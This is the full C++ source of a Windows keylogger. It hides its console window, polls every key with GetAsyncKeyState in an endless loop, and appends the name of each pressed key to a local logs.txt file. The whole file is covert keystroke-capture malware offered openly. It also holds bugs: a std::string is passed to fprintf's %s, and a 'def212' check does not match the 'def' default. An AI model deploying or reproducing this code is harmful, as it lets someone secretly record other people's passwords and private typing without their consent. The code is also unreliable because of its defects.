 /*
by akshat sahijpal
Decimal ASCII Chart
    16	DLE	32	SP	48	0	64	@	80	P	96	`	112	p
    17	DC1	33	!	49	1	65	A	81	Q	97	a	113	q
    18	DC2	34	"	50	2	66	B	82	R	98	b	114	r
    19	DC3	35	#	51	3	67	C	83	S	99	c	115	s
    20	DC4	36	$	52	4	68	D	84	T	100	d	116	t
    21	NAK	37	%	53	5	69	E	85	U	101	e	117	u
    22	SYN	38	&	54	6	70	F	86	V	102	f	118	v
    23	ETB	39	'	55	7	71	G	87	W	103	g	119	w
8	BS	24	CAN	40	(	56	8	72	H	88	X	104	h	120	x
9	HT	25	EM	41	)	57	9	73	I	89	Y	105	i	121	y
10	LF	26	SUB	42	*	58	:	74	J	90	Z	106	j	122	z
11	VT	27	ESC	43	+	59	;	75	K	91	[	107	k	123	{
12	FF	28	FS	44	,	60	<	76	L	92	\	108	l	124	|
13	CR	29	GS	45	-	61	=	77	M	93	]	109	m	125	}
14	SO	30	RS	46	.	62	>	78	N	94	^	110	n	126	~
15	SI	31	US	47	/	63	?	79	O	95	_	111	o	127	DEL
*/
#include <iostream>
#include<windows.h>
#include<string>
#include<fstream>
#define print(x) std::cout << x << std::endl
#define _MIN_ASCII_CHAR_ 8
#define _MAX_ASCII_CHAR_ 255
#define _KEY_PRESSED_ -32767

std::string convertToKey(int);

void LogPressedData(int i) {
    Sleep(10);
    FILE* LOG_FILE;
    LOG_FILE = fopen("logs.txt", "a+"); // open file and append data to it
    std::string vl = convertToKey(i);
    if (vl != "def212") {
        print(vl);
        fprintf(LOG_FILE, "%s", vl);
    }
    else {
        print(vl);
        fprintf(LOG_FILE, "%s", &i);
    }

    fclose(LOG_FILE);
}
int main() {
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // hides the console window. Remove this line if you need to view it
    while (true) {
        Sleep(20);
        for (char i = _MIN_ASCII_CHAR_; i < _MAX_ASCII_CHAR_; i++) {
            if (GetAsyncKeyState(i) == _KEY_PRESSED_) {
                LogPressedData(i);
            }// Checks if any key is pressed
        }
    }
}
std::string convertToKey(int i) {
    std::string logMessage;
    switch (i) {
    case VK_LEFT:
        logMessage = "LEFT_ARROW\n";
        // Process the LEFT ARROW key.
        break;

    case VK_RIGHT:
        logMessage = "RIGHT_ARROW\n";

        // Process the RIGHT ARROW key.

        break;

    case VK_UP:
        logMessage = "UP_ARROW\n";

        // Process the UP ARROW key.

        break;

    case VK_DOWN:

        logMessage = "DOWN_ARROW\n";
        // Process the DOWN ARROW key.

        break;

    case VK_HOME:

        logMessage = "HOME_KEY\n";
        // Process the HOME key.

        break;

    case VK_END:

        logMessage = "END_KEY\n";
        // Process the END key.
        break;
    case VK_INSERT:
        logMessage = "INSERT_KEY\n";
        // Process the INS key.
        break;
    case VK_DELETE:
        logMessage = "DELETE_KEY\n";
        // Process the DEL key.
        break;
    case VK_NUMPAD0:
        logMessage = "Numeric keypad 0 key\n";
        break;
    case VK_NUMPAD1:
        logMessage = "Numeric keypad 1 key\n";
        break;
    case VK_NUMPAD2:
        logMessage = "Numeric keypad 2 key\n";
        break;
    case VK_NUMPAD3:
        logMessage = "Numeric keypad 3 key\n";
        break;
    case VK_NUMPAD4:
        logMessage = "Numeric keypad 4 key\n";
        break;
    case VK_NUMPAD5:
        logMessage = "Numeric keypad 5 key\n";
        break;
    case VK_NUMPAD6:
        logMessage = "Numeric keypad 6 key\n";
        break;
    case VK_NUMPAD7:
        logMessage = "Numeric keypad 7 key\n";
        break;
    case VK_NUMPAD8:
        logMessage = "Numeric keypad 8 key\n";
        break;
    case VK_NUMPAD9:
        logMessage = "Numeric keypad 9 key\n";
        break;


    case VK_MULTIPLY:
        logMessage = "Multiply key\n";
        break;
    case VK_ADD:
        logMessage = "Add key\n";
        break;
    case VK_SEPARATOR:

        logMessage = "Separator key\n";
        break;
    case VK_SUBTRACT:

        logMessage = " Subtract key\n";
        break;
    case VK_DECIMAL:

        logMessage = "Decimal key";
        break;
    case VK_DIVIDE:

        logMessage = "Divide key";
        break;

    case VK_F1:
        logMessage = "F1_KEY\n";
        break;
    case VK_F2:
        logMessage = "F2_KEY\n";
        break;
    case VK_F3:
        logMessage = "F3_KEY\n";
        break;
    case VK_F4:
        logMessage = "F4_KEY\n";
        break;
    case VK_F5:
        logMessage = "F5_KEY\n";
        break;
    case VK_F6:
        logMessage = "F6_KEY\n";
        break;
    case VK_F7:
        logMessage = "F7_KEY\n";
        break;
    case VK_F8:
        logMessage = "F8_KEY\n";
        break;
    case VK_F9:
        logMessage = "F9_KEY\n";
        break;
    case VK_F10:
        logMessage = "F10_KEY\n";
        break;
    case VK_F11:
        logMessage = "F11_KEY\n";
        break;
    case VK_F12:
        logMessage = "F12_KEY\n";
        break;
    case 0x41:
        logMessage = "A";
        break;
    case 0x42:
        logMessage = "B";
        break;
    case 0x43:
        logMessage = "C";
        break;
    case 0x44:
        logMessage = "D";
        break;
    case 0x45:
        logMessage = "E";
        break;
    case 0x46:
        logMessage = "F";
        break;
    case 0x47:
        logMessage = "G";
        break;
    case 0x48:
        logMessage = "H";
        break;
    case 0x49:
        logMessage = "I";
        break;
    case 0x4A:
        logMessage = "J";
        break;
    case 0x4B:
        logMessage = "K";
        break;
    case 0x4C:
        logMessage = "L";
        break;
    case 0x4D:
        logMessage = "M";
        break;
    case 0x4E:
        logMessage = "N";
        break;
    case 0x4F:
        logMessage = "O";
        break;
    case 0x50:
        logMessage = "P";
        break;
    case 0x51:
        logMessage = "Q";
        break;
    case 0x52:
        logMessage = "R";
        break;
    case 0x53:
        logMessage = "S";
        break;
    case 0x54:
        logMessage = "T";
        break;
    case 0x55:
        logMessage = "U";
        break;
    case 0x56:
        logMessage = "V";
        break;
    case 0x57:
        logMessage = "W";
        break;
    case 0x58:
        logMessage = "X";
        break;
    case 0x59:
        logMessage = "Y";
        break;
    case 0x5A:
        logMessage = "Z";
        break;
    case VK_SELECT:
        logMessage = "SELECT key";
        break;
    case VK_PRINT:
        logMessage = "PRINT key";
        break;
    case VK_EXECUTE:
        logMessage = "EXECUTE key";
        break;
    case VK_SNAPSHOT:
        logMessage = "PRINT SCREEN key";
        break;
    case VK_HELP:
        logMessage = "HELP key";
        break;


    case 0x30:
        logMessage = "0";
        break;
    case 0x31:
        logMessage = "1";
        break;
    case 0x32:
        logMessage = "2";
        break;
    case 0x33:
        logMessage = "3";
        break;
    case 0x34:
        logMessage = "4";
        break;
    case 0x35:
        logMessage = "5";
        break;
    case 0x36:
        logMessage = "6";
        break;
    case 0x37:
        logMessage = "7";

        break;
    case 0x38:
        logMessage = "8";
        break;
    case 0x39:
        logMessage = "9";
        break;

    case VK_SPACE:
        logMessage = "SPACEBAR";
        break;


    case VK_BACK:
        logMessage = "BACKSPACE";
        break;
    case VK_TAB:
        logMessage = "TAB key";
        break;
    case VK_CLEAR:
        logMessage = "CLEAR key";
        break;
    case VK_RETURN:
        logMessage = "ENTER key";
        break;
    case VK_SHIFT:
        logMessage = "SHIFT key";
        break;
    case VK_CONTROL:
        logMessage = "CTRL key";
        break;
    case VK_MENU:
        logMessage = "ALT key";
        break;
    case VK_PAUSE:
        logMessage = "PAUSE key";
        break;
    case VK_CAPITAL:
        logMessage = "CAPS LOCK key";
        break;
    default:
        return "def";
    }
    return logMessage;
}